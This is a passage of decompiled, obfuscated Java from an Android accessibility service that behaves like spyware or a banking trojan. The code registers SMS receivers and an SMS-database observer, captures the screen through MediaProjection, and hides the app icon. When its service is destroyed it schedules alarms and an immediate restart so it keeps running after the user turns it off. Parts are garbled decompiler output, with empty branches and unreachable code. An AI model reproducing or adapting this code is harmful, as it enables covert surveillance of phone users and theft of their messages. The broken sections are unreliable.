                                c0319a4 = this.f52437g8;
                                if (c0319a4 == null) {
                                }
                                if (eventType2 != i2) {
                                    m211474g8(accessibilityEvent);
                                }
                                if (this.f52414e5 != null) {
                                    c0614i9 = this.f52414e5;
                                    if (c0614i9 != null) {
                                    }
                                }
                                if (eventType2 != 32) {
                                    c0329b4 = this.f52431g2;
                                    if (c0329b4 != null) {
                                        eventType = accessibilityEvent.getEventType();
                                        packageName = accessibilityEvent.getPackageName();
                                        if (packageName != null) {
                                            c0372a9.f55147a4.post(new RunnableC1224sj(eventType, 1, c0372a9, string));
                                        }
                                    }
                                }
                                if (eventType2 != 32) {
                                }
                                if (eventType2 != i3) {
                                    j41Var = C0360a2.f53810f9.getInstance();
                                    if (j41Var != null) {
                                    }
                                }
                                if (eventType2 != 1) {
                                }
                                C0341a7.f53380c1.getInstance();
                                return;
                            }
                            str3 = "accessibilityEventManager";
                            C0341a7.f53380c1.getInstance();
                            return;
                        } catch (Exception unused19) {
                            return;
                        }
                        boolean z622 = z7;
                        long jCurrentTimeMillis222 = z ? System.currentTimeMillis() : 0L;
                        if (z) {
                            z2 = zM211486i0;
                            z3 = z;
                        }
                        if (z3) {
                        }
                        if (!this.f52477k8) {
                        }
                        if (this.f52477k8) {
                        }
                        if (eventType2 == 32) {
                        }
                        if (eventType2 == 64) {
                        }
                        c0335a1 = this.f52438g9;
                        if (c0335a1 == null) {
                        }
                        if (eventType2 != i) {
                        }
                        c0319a4 = this.f52437g8;
                        if (c0319a4 == null) {
                        }
                        if (eventType2 != i2) {
                        }
                        if (this.f52414e5 != null) {
                        }
                        if (eventType2 != 32) {
                        }
                        if (eventType2 != 32) {
                        }
                        if (eventType2 != i3) {
                        }
                        if (eventType2 != 1) {
                        }
                    } catch (Throwable th2) {
                        th = th2;
                        accessibilityNodeInfo = r15;
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "⚠️ [onAccessibilityEvent] 意外异常被拦截，服务保持运行", e);
        }
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        try {
            m211528m6();
            t60.m214714d6("dqtvuisjd", "✅ [onCreate] 前台服务已在 accessibility 绑定前启动");
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ [onCreate] 前台服务启动失败", e);
        }
    }

    @Override // android.app.Service
    public void onDestroy() {
        boolean z;
        t60.m214714d6("dqtvuisjd", "🛑 无障碍服务正在销毁");
        try {
            AbstractC0315a0.m211548b0("无障碍服务被销毁");
        } catch (Exception unused) {
        }
        try {
            AbstractC0315a0.m211545a7("无障碍服务被系统销毁 可能被用户关闭或系统回收");
        } catch (Exception unused2) {
        }
        try {
            u11 u11Var = this.f52379b0;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            this.f52379b0 = null;
        } catch (Exception unused3) {
        }
        try {
            C0263a5 c0263a5 = this.f52370a1;
            if (c0263a5 != null) {
                c0263a5.m211357b4();
            }
        } catch (Exception unused4) {
        }
        try {
            t60.m214726f4("MediaProjectionHolder", "🧹 清理权限数据（权限可能已过期）");
            AbstractC0241a0.f51907a1 = null;
            AbstractC0241a0.f51908a2 = null;
            AbstractC0241a0.f51909a3 = 0L;
        } catch (Exception unused5) {
        }
        try {
            u11 u11Var2 = this.f52383b4;
            if (u11Var2 != null) {
                u11Var2.m215253a7(null);
            }
            u11 u11Var3 = this.f52395c6;
            if (u11Var3 != null) {
                u11Var3.m215253a7(null);
            }
            u11 u11Var4 = this.f52409e0;
            if (u11Var4 != null) {
                u11Var4.m215253a7(null);
            }
            u11 u11Var5 = this.f52443h4;
            if (u11Var5 != null) {
                u11Var5.m215253a7(null);
            }
        } catch (Exception unused6) {
        }
        try {
            arniezsqllm arniezsqllmVar = this.f52461j2;
            if (arniezsqllmVar != null) {
                unregisterReceiver(arniezsqllmVar);
                this.f52461j2 = null;
                t60.m214714d6("dqtvuisjd", "📩 ✅ 短信接收器已注销");
            }
        } catch (Exception e) {
            try {
                t60.m214705c6("dqtvuisjd", "📩 ❌ 注销短信接收器失败", e);
            } catch (Exception unused7) {
            }
        }
        try {
            C0931ny c0931ny = this.f52462j3;
            if (c0931ny != null) {
                getContentResolver().unregisterContentObserver(c0931ny);
                this.f52462j3 = null;
                t60.m214714d6("dqtvuisjd", "📩 ✅ 短信数据库监听器已注销");
            }
            HandlerThread handlerThread = this.f52463j4;
            if (handlerThread != null) {
                handlerThread.quitSafely();
            }
            this.f52463j4 = null;
        } catch (Exception e2) {
            try {
                t60.m214705c6("dqtvuisjd", "📩 ❌ 注销短信数据库监听器失败", e2);
            } catch (Exception unused8) {
            }
        }
        try {
            unregisterReceiver(this.f52465j6);
            t60.m214714d6("dqtvuisjd", "已注销权限申请广播接收器");
        } catch (Exception e3) {
            try {
                t60.m214705c6("dqtvuisjd", "注销广播接收器失败", e3);
            } catch (Exception unused9) {
            }
        }
        boolean z2 = false;
        try {
            if (this.f52458i9) {
                try {
                    unregisterReceiver(this.f52457i8);
                    this.f52458i9 = false;
                    t60.m214714d6("dqtvuisjd", "✅ 已注销屏幕状态广播接收器");
                } catch (Exception e4) {
                    t60.m214705c6("dqtvuisjd", "❌ 注销屏幕状态广播接收器失败", e4);
                }
            }
        } catch (Exception unused10) {
        }
        try {
            if (this.f52460j1) {
                try {
                    dqtvuisjd$registerLocalServiceActionReceiver$1 dqtvuisjd_registerlocalserviceactionreceiver_1 = this.f52459j0;
                    if (dqtvuisjd_registerlocalserviceactionreceiver_1 != null) {
                        unregisterReceiver(dqtvuisjd_registerlocalserviceactionreceiver_1);
                    }
                    this.f52459j0 = null;
                    this.f52460j1 = false;
                    t60.m214714d6("dqtvuisjd", "✅ 已注销 local-service 广播接收器");
                } catch (Exception e5) {
                    t60.m214705c6("dqtvuisjd", "❌ 注销 local-service 广播接收器失败", e5);
                }
            }
        } catch (Exception unused11) {
        }
        try {
            if (this.f52488l9) {
                try {
                    unregisterReceiver(this.f52489m0);
                    this.f52488l9 = false;
                    t60.m214714d6("dqtvuisjd", "✅ 已注销权限健康监控广播接收器");
                } catch (Exception e6) {
                    t60.m214705c6("dqtvuisjd", "❌ 注销权限健康监控广播接收器失败", e6);
                }
            }
        } catch (Exception unused12) {
        }
        try {
            dqtvuisjd$registerNetworkEventReceivers$1 dqtvuisjd_registernetworkeventreceivers_1 = this.f52466j7;
            if (dqtvuisjd_registernetworkeventreceivers_1 != null) {
                unregisterReceiver(dqtvuisjd_registernetworkeventreceivers_1);
                this.f52466j7 = null;
            }
        } catch (Exception unused13) {
        }
        try {
            mj1 mj1Var = nj1.f58634a4;
            Context applicationContext = getApplicationContext();
            t60.m214694b5(applicationContext, "applicationContext");
            mj1Var.getInstance(applicationContext).m214110a2();
        } catch (Exception unused14) {
        }
        try {
            C0329b4 c0329b4 = this.f52431g2;
            if (c0329b4 != null) {
                c0329b4.f53200a5 = false;
                AbstractC1117qo.m214410a3(c0329b4.f53197a2);
                ExecutorC1158qw executorC1158qw = AbstractC1262tj.f60234a1;
                y21 y21Var = new y21();
                executorC1158qw.getClass();
                c0329b4.f53197a2 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(executorC1158qw, y21Var));
            }
        } catch (Exception unused15) {
        }
        try {
            C0323a8 c0323a8 = this.f52415e6;
            if (c0323a8 != null) {
                c0323a8.f53117b7 = null;
            }
        } catch (Exception unused16) {
        }
        try {
            C0614i9 c0614i9 = this.f52414e5;
            if (c0614i9 != null) {
                Handler handler = c0614i9.f56838b8;
                RunnableC0613i8 runnableC0613i8 = c0614i9.f56836b6;
                if (runnableC0613i8 != null) {
                    handler.removeCallbacks(runnableC0613i8);
                }
                RunnableC0613i8 runnableC0613i82 = c0614i9.f56837b7;
                if (runnableC0613i82 != null) {
                    handler.removeCallbacks(runnableC0613i82);
                }
                c0614i9.f56836b6 = null;
                c0614i9.f56837b7 = null;
                AbstractC1117qo.m214410a3(c0614i9.f56822a2);
            }
        } catch (Exception unused17) {
        }
        try {
            r80 r80Var = this.f52422f3;
            if (r80Var != null) {
                try {
                    AbstractC1117qo.m214410a3(r80Var.f59640a0);
                } catch (Exception e7) {
                    t60.m214705c6("KeyEventManager", "❌ 清理按键事件管理器失败", e7);
                }
            }
        } catch (Exception unused18) {
        }
        try {
            C0328b3 c0328b3 = this.f52434g5;
            if (c0328b3 != null) {
                AbstractC1117qo.m214410a3(c0328b3.f53191a4);
            }
        } catch (Exception unused19) {
        }
        try {
            C0318a3 c0318a3 = this.f52428f9;
            if (c0318a3 != null) {
                c0318a3.f53046a1 = ConfigProgressManager$ConfigStage.IDLE;
                AbstractC1117qo.m214410a3(c0318a3.f53051a6);
            }
        } catch (Exception unused20) {
        }
        try {
            C0317a2 c0317a2 = this.f52418e9;
            if (c0317a2 != null) {
                c0317a2.f53044a3 = false;
                AbstractC0780a0.m213689a0(c0317a2.f53043a2.f58395a0);
                AbstractC1117qo.m214410a3(c0317a2.f53043a2);
            }
        } catch (Exception unused21) {
        }
        try {
            C0262a4 c0262a4 = this.f52375a6;
            if (c0262a4 != null) {
                c0262a4.m211338a2();
            }
        } catch (Exception unused22) {
        }
        try {
            fn0 fn0Var = this.f52376a7;
            if (fn0Var != null) {
                fn0Var.m212841a0();
            }
        } catch (Exception unused23) {
        }
        try {
            jr0.f57363a1.releaseInstance();
        } catch (Exception unused24) {
        }
        try {
            AbstractC1117qo.m214410a3(this.f52378a9);
        } catch (Exception unused25) {
        }
        try {
            this.f52447h8 = false;
        } catch (Exception unused26) {
        }
        try {
            InitWorkerService.f52298a2.forceReset();
        } catch (Exception unused27) {
        }
        try {
            f52358m1.getUninstallMainHandler().removeCallbacksAndMessages(null);
            C0356a1 c0356a1 = this.f52436g7;
            if (c0356a1 != null) {
                c0356a1.f53719a2 = false;
                c0356a1.f53727b0.removeCallbacksAndMessages(null);
                C0356a1.f53715b3 = null;
                c0356a1.f53726a9.quitSafely();
            }
        } catch (Exception unused28) {
        }
        try {
            z = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false);
        } catch (Exception unused29) {
            z = false;
        }
        if (z) {
            try {
                Object systemService = getSystemService("alarm");
                AlarmManager alarmManager = systemService instanceof AlarmManager ? (AlarmManager) systemService : null;
                Context applicationContext2 = getApplicationContext();
                Intent intent = new Intent(getApplicationContext(), (Class<?>) tisxhskrc.class);
                intent.setAction("com.storm.safe.rock.action.QUICK_SYNC");
                PendingIntent broadcast = PendingIntent.getBroadcast(applicationContext2, 77, intent, 201326592);
                if (Build.VERSION.SDK_INT < 31 || (alarmManager != null && alarmManager.canScheduleExactAlarms())) {
                    z2 = true;
                }
                if (z2) {
                    if (alarmManager != null) {
                        alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 1000, broadcast);
                    }
                } else if (alarmManager != null) {
                    alarmManager.setAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 1000, broadcast);
                }
            } catch (Exception unused30) {
            }
            try {
                zgafaqvswksa.C0382a0 c0382a0 = zgafaqvswksa.f55191a0;
                Context applicationContext3 = getApplicationContext();
                t60.m214694b5(applicationContext3, "applicationContext");
                c0382a0.scheduleImmediateRestart(applicationContext3);
            } catch (Exception unused31) {
            }
        }
        f52364m7 = null;
        super.onDestroy();
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
        t60.m214726f4("dqtvuisjd", "无障碍服务被中断");
        try {
            AbstractC0315a0.m211545a7("无障碍服务被中断 系统或用户中断了服务");
        } catch (Exception unused) {
        }
        try {
            C0263a5 c0263a5 = this.f52370a1;
            if (c0263a5 != null) {
                c0263a5.m211357b4();
                t60.m214714d6("dqtvuisjd", "✅ [中断] 已停止屏幕捕获");
            }
        } catch (Exception unused2) {
        }
        try {
            if (this.f52413e4 != null) {
                t60.m214726f4("ServiceLifecycleManager", "⚠️ 无障碍服务被中断");
            }
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "⚠️ [onInterrupt] handleServiceInterrupt 异常", e);
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final boolean onKeyEvent(KeyEvent keyEvent) {
        t60.m214695b6(keyEvent, "event");
        if (keyEvent.getKeyCode() == 26 && keyEvent.getAction() == 0 && keyEvent.isLongPress()) {
            System.currentTimeMillis();
            t60.m214702c3("dqtvuisjd", "🔴 [电源键] 检测到长按电源键");
        }
        return super.onKeyEvent(keyEvent);
    }

    @Override // android.app.Service
    public final void onRebind(Intent intent) {
        super.onRebind(intent);
        t60.m214714d6("dqtvuisjd", "🔄 无障碍服务 onRebind（避免重建）");
        try {
            AbstractC0315a0.m211545a7("无障碍服务重新绑定 服务恢复");
        } catch (Exception unused) {
        }
        f52364m7 = this;
    }

    /* JADX WARN: Removed duplicated region for block: B:20:0x0097  */
    /* JADX WARN: Removed duplicated region for block: B:23:0x00ab A[Catch: Exception -> 0x00c8, TryCatch #2 {Exception -> 0x00c8, blocks: (B:21:0x00a3, B:23:0x00ab, B:26:0x00ca, B:37:0x010a, B:39:0x010e, B:40:0x0111, B:35:0x00f7, B:27:0x00d5, B:29:0x00ee, B:33:0x00f4), top: B:50:0x00a3, inners: #4 }] */
    /* JADX WARN: Removed duplicated region for block: B:29:0x00ee A[Catch: Exception -> 0x00f1, TryCatch #4 {Exception -> 0x00f1, blocks: (B:27:0x00d5, B:29:0x00ee, B:33:0x00f4), top: B:54:0x00d5, outer: #2 }] */
    /* JADX WARN: Removed duplicated region for block: B:32:0x00f3  */
    /* JADX WARN: Removed duplicated region for block: B:39:0x010e A[Catch: Exception -> 0x00c8, TryCatch #2 {Exception -> 0x00c8, blocks: (B:21:0x00a3, B:23:0x00ab, B:26:0x00ca, B:37:0x010a, B:39:0x010e, B:40:0x0111, B:35:0x00f7, B:27:0x00d5, B:29:0x00ee, B:33:0x00f4), top: B:50:0x00a3, inners: #4 }] */
    @Override // android.accessibilityservice.AccessibilityService
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void onServiceConnected() {
        u11 u11Var;
        super.onServiceConnected();
        t60.m214714d6("dqtvuisjd", "✅ [服务] 无障碍服务已连接");
        try {
            AbstractC0315a0.m211545a7("无障碍服务已启动连接");
        } catch (Exception unused) {
        }
        boolean z = false;
        try {
            File file = new File("/data/local/tmp/app_setup_done.json");
            if (file.exists()) {
                SharedPreferences sharedPreferences = getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0);
                if (!sharedPreferences.getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false) && new JSONObject(AbstractC1517zh.m215420f8(file)).optBoolean("setupDone", false)) {
                    sharedPreferences.edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).putBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), true).putBoolean("icon_hidden", true).apply();
                    getSharedPreferences(StringUtil.m212470a0("I1AVP3IrGC9DNA=="), 0).edit().putBoolean(StringUtil.m212470a0("IkouMkQ8CCtZ"), true).apply();
                    try {
                        t60.m214714d6("dqtvuisjd", "✅ [重装恢复] Service检测到适配标记，已恢复全部状态");
                        z = true;
                    } catch (Exception e) {
                        e = e;
                        z = true;
                        tz0.m214810b0("⚠️ [重装恢复] 读取标记文件异常: ", e.getMessage(), "dqtvuisjd");
                        if (z) {
                        }
                        if (!AbstractC1117qo.m214443d9(this.f52378a9)) {
                        }
                        f52365m8 = System.currentTimeMillis();
                        f52364m7 = this;
                        m211450d5();
                        Object systemService = getSystemService("power");
                        t60.m214693b4(systemService, "null cannot be cast to non-null type android.os.PowerManager");
                        this.f52384b5 = (PowerManager) systemService;
                        Object systemService2 = getSystemService("keyguard");
                        this.f52385b6 = !(systemService2 instanceof KeyguardManager) ? (KeyguardManager) systemService2 : null;
                        try {
                            AppCoreService.C0277a0 c0277a0 = AppCoreService.f52296a0;
                            Context applicationContext = getApplicationContext();
                            t60.m214694b5(applicationContext, "applicationContext");
                            c0277a0.start(applicationContext);
                        } catch (Exception unused2) {
                        }
                        u11Var = this.f52379b0;
                        if (u11Var != null) {
                        }
                        this.f52379b0 = AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new C02982(null), 2);
                    }
                }
            }
        } catch (Exception e2) {
            e = e2;
        }
        if (z) {
            AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new C02971(null), 2);
        }
        try {
            if (!AbstractC1117qo.m214443d9(this.f52378a9)) {
                C1180rh c1180rh = AbstractC1262tj.f60233a0;
                C0785a0 c0785a0 = sc0.f59953a0;
                y21 y21Var = new y21();
                c0785a0.getClass();
                this.f52378a9 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var).mo212744b2(this.f52377a8));
            }
            f52365m8 = System.currentTimeMillis();
            f52364m7 = this;
            m211450d5();
            try {
                Object systemService3 = getSystemService("power");
                t60.m214693b4(systemService3, "null cannot be cast to non-null type android.os.PowerManager");
                this.f52384b5 = (PowerManager) systemService3;
                Object systemService22 = getSystemService("keyguard");
                this.f52385b6 = !(systemService22 instanceof KeyguardManager) ? (KeyguardManager) systemService22 : null;
            } catch (Exception e3) {
                t60.m214705c6("dqtvuisjd", "❌ PowerManager/Keyguard 初始化失败", e3);
            }
            AppCoreService.C0277a0 c0277a02 = AppCoreService.f52296a0;
            Context applicationContext2 = getApplicationContext();
            t60.m214694b5(applicationContext2, "applicationContext");
            c0277a02.start(applicationContext2);
            u11Var = this.f52379b0;
            if (u11Var != null) {
                u11Var.m215253a7(null);
            }
            this.f52379b0 = AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new C02982(null), 2);
        } catch (Exception e4) {
            t60.m214705c6("dqtvuisjd", "❌ onServiceConnected失败", e4);
        }
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        try {
            m211528m6();
        } catch (Exception unused) {
        }
        if (intent == null) {
            return 1;
        }
        try {
            if (!t60.m214686a2(intent.getAction(), "com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED")) {
                return 1;
            }
            try {
                t60.m214714d6("dqtvuisjd", "通过Intent接收到MediaProjection权限获取成功通知");
                m211472g6();
                return 1;
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "处理Intent通知失败", e);
                return 1;
            }
        } catch (Exception e2) {
            t60.m214705c6("dqtvuisjd", "⚠️ [onStartCommand] 意外异常", e2);
            return 1;
        }
    }

    @Override // android.app.Service
    public final boolean onUnbind(Intent intent) {
        C0263a5 c0263a5 = this.f52370a1;
        if (c0263a5 != null) {
            try {
                c0263a5.m211350a6();
            } catch (Exception unused) {
            }
        }
        t60.m214714d6("dqtvuisjd", "🔄 无障碍服务 onUnbind");
        try {
            AbstractC0315a0.m211545a7("无障碍服务解绑 系统正在解除绑定");
            return true;
        } catch (Exception unused2) {
            return true;
        }
    }
}
